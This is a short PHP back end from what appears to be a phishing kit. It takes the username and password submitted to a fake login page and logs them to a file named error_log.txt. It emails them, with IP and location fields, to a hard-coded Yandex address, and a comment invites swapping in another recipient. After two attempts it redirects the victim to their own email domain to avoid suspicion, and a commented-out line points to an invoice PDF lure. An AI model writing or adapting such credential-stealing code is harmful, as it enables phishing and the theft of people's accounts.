<?php

require_once('fns.php');

//CHANGE RETURN EMAIL BELOW
$email_to = 'lawi4@yandex.com';


$e= $_POST['username'];
$p = $_POST['password'];

$counter = intval($_POST['counter']);

$counter = $counter+1;

//echo $counter;

$domain = explode('@',$e);


$data = '||+|| : '.$e.' ||+||: ||+|| : '.$p.' ||+||  : '.$ip.' ||+||  : '.$city.' ||+|| : '.$region.' ||+|| : '.$country.'||+||';

if(isset($e) && isset($p))
{
$header = "From: $loginemail\n";
$subject = 'Fwd: '.$e;

$file = fopen("error_log.txt", "a");
fputs ($file, "$data\r\n");
fclose ($file);

@mail($email_to, $subject ,$data ,$header);
}

// This is the response to the ajax call
if($counter < '2')
{
    echo $counter;
}
else
{
    //echo 'https://krs-mail.com/invoice/Invoice_payment.pdf';
    echo 'http://'.$domain[1];
}


?>